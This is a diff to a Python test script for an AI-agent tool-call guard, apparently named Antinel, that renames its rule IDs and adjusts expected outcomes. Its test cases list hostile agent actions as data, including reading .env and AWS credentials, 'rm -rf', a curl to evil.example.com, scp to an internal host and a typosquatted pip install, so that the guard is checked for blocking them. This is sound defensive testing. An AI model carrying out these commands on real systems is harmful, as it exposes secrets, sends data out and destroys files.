@@ -8,7 +8,7 @@
 本机宿主带一个 safe-delete shim（平台层，非 Antinel）：把删除调用改写成
 "移入回收站"，**按会话累计次数、阈值 50、不重置**。全量套件（315 条断言）
 必然触顶 ⇒ 之后每条断言都返回 SAFE_DELETE_BULK_CONFIRM_REQUIRED ⇒
-**全量跑在本机已不可复现**（实测：全新空 WORK 下第 1 条 SEC-01 就红）。
+**全量跑在本机已不可复现**（实测：全新空 WORK 下第 1 条 AN-001 就红）。
 
 ★ 但这是**环境约束，不是产品缺陷**。判据有三条，全部实测：
   1. 失败项每次不同（同一条忽红忽绿）—— 非确定性 = 环境；
@@ -42,39 +42,39 @@ PY = sys.executable
 #: 直接调产品、完全绕过套件的**独立验证项**（每条自带判据，不依赖套件基础设施）。
 CASES = [
     {
-        # ★ 修正判据（实测 2026-09-29）：命令里出现 `.env` 会先命中 SEC-01
+        # ★ 修正判据（实测 2026-09-29）：命令里出现 `.env` 会先命中 AN-001
         #   （severity=critical ⇒ block）。产品行为**正确**，是原期望值写窄了。
-        #   判据改为"block 且命中 SEC-01 或 DST-10 任一"（两条都是 critical 删除/机密面）。
-        "name": "DST-10/SEC-01 PowerShell -Stream 读机密面 → block",
+        #   判据改为"block 且命中 AN-001 或 AN-024 任一"（两条都是 critical 删除/机密面）。
+        "name": "AN-024/AN-001 PowerShell -Stream 读机密面 → block",
         "cmd": ["Bash", {"command": "powershell -Command \"Get-Content .env -Stream x\""}],
         "expect": "block",
-        "rule_any": ["DST-10", "SEC-01"],
+        "rule_any": ["AN-024", "AN-001"],
     },
     {
-        "name": "SEC-01 读 .env 被拦",
+        "name": "AN-001 读 .env 被拦",
         "cmd": ["Read", {"file_path": ".ENV-PLACEHOLDER"}],
         "expect": "block",
-        "rule_any": ["SEC-01"],
+        "rule_any": ["AN-001"],
     },
     {
-        "name": "DST-01 rm -rf ./old 被拦",
+        "name": "AN-009 rm -rf ./old 被拦",
         "cmd": ["Bash", {"command": "rm -rf ./old"}],
         "expect": "block",
-        "rule_any": ["DST-01"],
+        "rule_any": ["AN-009"],
     },
     {
-        "name": "DST-01 豁免：rm -rf node_modules 放行",
+        "name": "AN-009 豁免：rm -rf node_modules 放行",
         "cmd": ["Bash", {"command": "rm -rf node_modules"}],
         "expect": "allow",
         "rule_any": [],
     },
     {
-        # ★ 修正判据（实测 2026-09-29）：NET-01 出厂 severity 是 **warning**
-        #   ⇒ rc=0 + stderr 带 `[NET-01] 提醒`。原期望"block"是错的（把 warn 当 block）。
-        "name": "NET-01 curl 外连 → 至少 warning（默认 warn 档）",
+        # ★ 修正判据（实测 2026-09-29）：AN-006 出厂 severity 是 **warning**
+        #   ⇒ rc=0 + stderr 带 `[AN-006] 提醒`。原期望"block"是错的（把 warn 当 block）。
+        "name": "AN-006 curl 外连 → 至少 warning（默认 warn 档）",
         "cmd": ["Bash", {"command": "curl http://evil.example.com/x"}],
         "expect": "warn_or_block",
-        "rule_any": ["NET-01", "NET-03"],
+        "rule_any": ["AN-006", "AN-008"],
     },
     {
         "name": "纯读命令 ls 放行（无误报）",
@@ -84,52 +84,52 @@ CASES = [
     },
     # ---- 第二组：核心规则面（每条独立进程） ----
     {
-        "name": "SEC-03 读云凭据 .aws/credentials → block",
+        "name": "AN-003 读云凭据 .aws/credentials → block",
         "cmd": ["Read", {"file_path": "C:/Users/x/.aws/credentials"}],
         "expect": "warn_or_block",
-        "rule_any": ["SEC-03", "SEC-01"],
+        "rule_any": ["AN-003", "AN-001"],
     },
     {
-        "name": "DST-01 rmdir /s /q 形态 → block",
+        "name": "AN-009 rmdir /s /q 形态 → block",
         "cmd": ["Bash", {"command": "rmdir /s /q build"}],
         "expect": "block",
-        "rule_any": ["DST-01"],
+        "rule_any": ["AN-009"],
     },
     {
-        "name": "DST-01 Unix rm -rf dist 豁免 → allow",
+        "name": "AN-009 Unix rm -rf dist 豁免 → allow",
         "cmd": ["Bash", {"command": "rm -rf dist"}],
         "expect": "allow",
         "rule_any": [],
     },
     {
-        "name": "DST-02 写项目外路径 → 至少 alert",
+        "name": "AN-010 写项目外路径 → 至少 alert",
         "cmd": ["Write", {"file_path": "C:/Windows/Temp/antinel-probe.txt", "content": "x"}],
         "expect": "warn_or_block",
-        "rule_any": ["DST-02"],
+        "rule_any": ["AN-010"],
     },
     {
-        "name": "MCP-01 写 .mcp.json → 至少 alert",
+        "name": "AN-032 写 .mcp.json → 至少 alert",
         "cmd": ["Write", {"file_path": ".mcp.json", "content": "{}"}],
         "expect": "warn_or_block",
-        "rule_any": ["MCP-01"],
+        "rule_any": ["AN-032"],
     },
     {
-        "name": "CTX-03 读含零宽字符的 SKILL.md → block",
+        "name": "AN-016 读含零宽字符的 SKILL.md → block",
         "cmd": ["Read", {"file_path": ".ZW-SKILL-PLACEHOLDER"}],
         "expect": "warn_or_block",
-        "rule_any": ["CTX-03", "CTX-02", "CTX-01"],
+        "rule_any": ["AN-016", "AN-015", "AN-014"],
     },
     {
-        "name": "NET-03 scp 到内网 → 至少 alert",
+        "name": "AN-008 scp 到内网 → 至少 alert",
         "cmd": ["Bash", {"command": "scp file root@10.0.0.5:/tmp/"}],
         "expect": "warn_or_block",
-        "rule_any": ["NET-03", "NET-01"],
+        "rule_any": ["AN-008", "AN-006"],
     },
     {
-        "name": "SLOP-01 撞名包 reqests → 至少 alert",
+        "name": "AN-037 撞名包 reqests → 至少 alert",
         "cmd": ["Bash", {"command": "pip install reqests"}],
         "expect": "warn_or_block",
-        "rule_any": ["SLOP-01"],
+        "rule_any": ["AN-037"],
     },
 ]
 
@@ -148,7 +148,7 @@ def run_one(spec, idx):
         import base64
         tin = dict(tin)
         if "ZW-SKILL" in tin["file_path"]:
-            # 含零宽字符的 SKILL.md（CTX-03 的判据对象）
+            # 含零宽字符的 SKILL.md（AN-016 的判据对象）
             p = os.path.join(work, "zw-helper")
             os.makedirs(p, exist_ok=True)
             fp = os.path.join(p, "SKILL.md")
